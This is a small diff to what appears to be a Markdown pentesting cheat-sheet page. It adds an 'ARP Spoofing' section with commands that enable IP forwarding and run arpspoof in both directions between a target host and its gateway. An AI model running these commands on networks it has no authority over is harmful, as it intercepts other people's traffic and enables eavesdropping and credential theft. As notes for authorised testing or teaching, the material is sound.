@@ -14,6 +14,9 @@ nav_order: 1
 1. TOC
 {:toc}
 
-### Arp Spoofing
+### ARP Spoofing
 
-`code goes here`
+`echo 1 > /proc/sys/net/ipv4/ip_forward` - enables IP forwarding 
+`arpspoof -i <int> -t <target ip addr> -r <host to spoof i.e. gw>`
+`arpspoof -i <int> -r <host to spoof i.e. gw> -t <target ip addr>`
+
